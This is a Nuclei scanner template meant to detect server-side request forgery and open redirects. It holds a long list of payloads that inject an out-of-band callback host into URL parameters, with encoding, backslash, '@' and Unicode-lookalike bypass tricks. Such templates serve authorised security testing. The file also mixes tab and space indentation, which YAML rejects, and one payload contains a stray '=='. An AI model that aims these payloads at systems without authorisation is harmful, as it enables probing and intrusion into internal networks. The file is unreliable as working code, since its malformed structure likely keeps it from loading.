id: dalaho-ssrf

info:
  name: ssrf - Detect
  author: dalaho004
  severity: medium
  tags: ssrf


requests:
  - method: GET
    path:
      - "{{BaseURL}}/{{ssrf}}"
	  
  - method: POST
    path:
      - "{{BaseURL}}/{{ssrf}}"

    payloads:
     ssrf:
       - '?dest={{interactsh-url}}'
	   - '?redirect={{interactsh-url}}'
	   - '?uri={{interactsh-url}}'
	   - '?path={{interactsh-url}}'
	   - '?continue={{interactsh-url}}'
	   - '?url={{interactsh-url}}'
	   - '?window={{interactsh-url}}'
	   - '?next={{interactsh-url}}'
	   - '?date={{interactsh-url}}'
	   - '?reference={{interactsh-url}}'
	   - '?site={{interactsh-url}}'
	   - '?html={{interactsh-url}}'
	   - '?val={{interactsh-url}}'
	   - '?validate={{interactsh-url}}'
	   - '?domain={{interactsh-url}}'
	   - '?callback={{interactsh-url}}'
	   - '?return={{interactsh-url}}'
	   - '?page={{interactsh-url}}'
	   - '?feed={{interactsh-url}}'
	   - '?host={{interactsh-url}}'
	   - '?port={{interactsh-url}}'
	   - '?to={{interactsh-url}}'
	   - '?out={{interactsh-url}}'
	   - '?view={{interactsh-url}}'
	   - '?dir={{interactsh-url}}'
	   - '?show={{interactsh-url}}'
	   - '?navigation={{interactsh-url}}'
	   - '&dest={{interactsh-url}}'
	   - '&redirect={{interactsh-url}}'
	   - '&uri={{interactsh-url}}'
	   - '&path={{interactsh-url}}'
	   - '&continue={{interactsh-url}}'
	   - '&url={{interactsh-url}}'
	   - '&window={{interactsh-url}}'
	   - '&next={{interactsh-url}}'
	   - '&date={{interactsh-url}}'
	   - '&reference={{interactsh-url}}'
	   - '&site={{interactsh-url}}'
	   - '&html={{interactsh-url}}'
	   - '&val={{interactsh-url}}'
	   - '&validate={{interactsh-url}}'
	   - '&domain={{interactsh-url}}'
	   - '&callback={{interactsh-url}}'
	   - '&return={{interactsh-url}}'
	   - '&page={{interactsh-url}}'
	   - '&feed={{interactsh-url}}'
	   - '&host={{interactsh-url}}'
	   - '&port={{interactsh-url}}'
	   - '&to={{interactsh-url}}'
	   - '&out={{interactsh-url}}'
	   - '&view={{interactsh-url}}'
	   - '&dir={{interactsh-url}}'
	   - '&show={{interactsh-url}}'
	   - '&navigation={{interactsh-url}}'
	   - '?dest={{RootURL}}///{{interactsh-url}}'
	   - '?redirect={{RootURL}}///{{interactsh-url}}'
	   - '?uri={{RootURL}}///{{interactsh-url}}'
	   - '?path={{RootURL}}///{{interactsh-url}}'
	   - '?continue={{RootURL}}///{{interactsh-url}}'
	   - '?url=={{RootURL}}///{{interactsh-url}}'
	   - '?window={{RootURL}}///{{interactsh-url}}'
	   - '?next={{RootURL}}///{{interactsh-url}}'
	   - '?date={{RootURL}}///{{interactsh-url}}'
	   - '?reference={{RootURL}}///{{interactsh-url}}'
	   - '?site={{RootURL}}///{{interactsh-url}}'
	   - '?html={{RootURL}}///{{interactsh-url}}'
	   - '?val={{RootURL}}///{{interactsh-url}}'
	   - '?validate={{RootURL}}///{{interactsh-url}}'
	   - '?domain={{RootURL}}///{{interactsh-url}}'
	   - '?callback={{RootURL}}///{{interactsh-url}}'
	   - '?return={{RootURL}}///{{interactsh-url}}'
	   - '?page={{RootURL}}///{{interactsh-url}}'
	   - '?feed={{RootURL}}///{{interactsh-url}}'
	   - '?host={{RootURL}}///{{interactsh-url}}'
	   - '?port={{RootURL}}///{{interactsh-url}}'
	   - '?to={{RootURL}}///{{interactsh-url}}'
	   - '?out={{RootURL}}///{{interactsh-url}}'
	   - '?view={{RootURL}}///{{interactsh-url}}'
	   - '?dir={{RootURL}}///{{interactsh-url}}'
	   - '?show={{RootURL}}///{{interactsh-url}}'
	   - '?navigation={{RootURL}}///{{interactsh-url}}'
	   - '&dest={{RootURL}}///{{interactsh-url}}'
	   - '&redirect={{RootURL}}///{{interactsh-url}}'
	   - '&uri={{RootURL}}///{{interactsh-url}}'
	   - '&path={{RootURL}}///{{interactsh-url}}'
	   - '&continue={{RootURL}}///{{interactsh-url}}'
	   - '&url={{RootURL}}///{{interactsh-url}}'
	   - '&window={{RootURL}}///{{interactsh-url}}'
	   - '&next={{RootURL}}///{{interactsh-url}}'
	   - '&date={{RootURL}}///{{interactsh-url}}'
	   - '&reference={{RootURL}}///{{interactsh-url}}'
	   - '&site={{RootURL}}///{{interactsh-url}}'
	   - '&html={{RootURL}}///{{interactsh-url}}'
	   - '&val={{RootURL}}///{{interactsh-url}}'
	   - '&validate={{RootURL}}///{{interactsh-url}}'
	   - '&domain={{RootURL}}///{{interactsh-url}}'
	   - '&callback={{RootURL}}///{{interactsh-url}}'
	   - '&return={{RootURL}}///{{interactsh-url}}'
	   - '&page={{RootURL}}///{{interactsh-url}}'
	   - '&feed={{RootURL}}///{{interactsh-url}}'
	   - '&host={{RootURL}}///{{interactsh-url}}'
	   - '&port={{RootURL}}///{{interactsh-url}}'
	   - '&to={{RootURL}}///{{interactsh-url}}'
	   - '&out={{RootURL}}///{{interactsh-url}}'
	   - '&view={{RootURL}}///{{interactsh-url}}'
	   - '&dir={{RootURL}}///{{interactsh-url}}'
	   - '&show={{RootURL}}///{{interactsh-url}}'
	   - '&navigation={{RootURL}}///{{interactsh-url}}'
       - '%0d/{{interactsh-url}}/'
       - '%00/{{interactsh-url}}/'
       - '%09/{{interactsh-url}}/'
       - '%5C%5C{{interactsh-url}}/%252e%252e%252f'
       - '%5C{{interactsh-url}}'
       - '%5c{{interactsh-url}}/%2f%2e%2e'
       - '%5c{{RootURL}}{{interactsh-url}}/%2f%2e%2e'
       - '../{{interactsh-url}}'
       - '.{{interactsh-url}}'
       - '/%5c{{interactsh-url}}'
       - '////\;@{{interactsh-url}}'
       - '////{{interactsh-url}}'
       - '///{{interactsh-url}}'
       - '///{{interactsh-url}}/%2f%2e%2e'
       - '///{{interactsh-url}}@//'
       - '///{{RootURL}}{{interactsh-url}}/%2f%2e%2e'
       - '//;@{{interactsh-url}}'
       - '//\/{{interactsh-url}}/'
       - '//\@{{interactsh-url}}'
       - '//\{{interactsh-url}}'
       - '//\t{{interactsh-url}}/'
       - '//{{interactsh-url}}/%2F..'
       - '//{{interactsh-url}}//'
       - '//%69%6e%74%65%72%61%63%74%2e%73%68'
       - '//{{interactsh-url}}@//'
       - '//{{interactsh-url}}\t{{interactsh-url}}/'
       - '//https://{{interactsh-url}}@//'
       - '/<>//{{interactsh-url}}'
       - '/\/\/{{interactsh-url}}/'
       - '/\/{{interactsh-url}}'
       - '/\{{interactsh-url}}'
       - '/{{interactsh-url}}'
       - '/{{interactsh-url}}/%2F..'
       - '/{{interactsh-url}}/'
       - '/{{interactsh-url}}/..;/css'
       - '/https:{{interactsh-url}}'
       - '/{{RootURL}}{{interactsh-url}}/'
       - '/〱{{interactsh-url}}'
       - '/〵{{interactsh-url}}'
       - '/ゝ{{interactsh-url}}'
       - '/ー{{interactsh-url}}'
       - '/ｰ{{interactsh-url}}'
       - '<>//{{interactsh-url}}'
       - '@{{interactsh-url}}'
       - '@https://{{interactsh-url}}'
       - '\/\/{{interactsh-url}}/'
       - '{{interactsh-url}}'
       - '{{interactsh-url}}/'
       - '{{interactsh-url}}//'
       - '{{interactsh-url}};@'
       - 'https%3a%2f%2f{{interactsh-url}}%2f'
       - 'https:%0a%0d{{interactsh-url}}'
       - 'https://%0a%0d{{interactsh-url}}'
       - 'https://%09/{{interactsh-url}}'
       - 'https://%2f%2f.{{interactsh-url}}/'
       - 'https://%3F.{{interactsh-url}}/'
       - 'https://%5c%5c.{{interactsh-url}}/'
       - 'https://%5c{{interactsh-url}}@'
       - 'https://%23.{{interactsh-url}}/'
       - 'https://.{{interactsh-url}}'
       - 'https://////{{interactsh-url}}'
       - 'https:///{{interactsh-url}}'
       - 'https:///{{interactsh-url}}/%2e%2e'
       - 'https:///{{interactsh-url}}/%2f%2e%2e'
       - 'https:///{{interactsh-url}}@{{interactsh-url}}/%2e%2e'
       - 'https:///{{interactsh-url}}@{{interactsh-url}}/%2f%2e%2e'
       - 'https://:80#@{{interactsh-url}}/'
       - 'https://:80?@{{interactsh-url}}/'
       - 'https://:@\@{{interactsh-url}}'
       - 'https://:@{{interactsh-url}}\@{{interactsh-url}}'
       - 'https://;@{{interactsh-url}}'
       - 'https://\t{{interactsh-url}}/'
       - 'https://{{interactsh-url}}/{{interactsh-url}}'
       - 'https://{{interactsh-url}}/https://{{interactsh-url}}/'
       - 'https://www.\.{{interactsh-url}}'
       - 'https:/\/\{{interactsh-url}}'
       - 'https:/\{{interactsh-url}}'
       - 'https:/{{interactsh-url}}'
       - 'https:{{interactsh-url}}'
       - '{{RootURL}}{{interactsh-url}}'
       - '〱{{interactsh-url}}'
       - '〵{{interactsh-url}}'
       - 'ゝ{{interactsh-url}}'
       - 'ー{{interactsh-url}}'
       - 'ｰ{{interactsh-url}}'
       - 'redirect/{{interactsh-url}}'
       - 'cgi-bin/redirect.cgi?{{interactsh-url}}'
       - 'out?{{interactsh-url}}'
       - 'login?to=http://{{interactsh-url}}'
	   
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"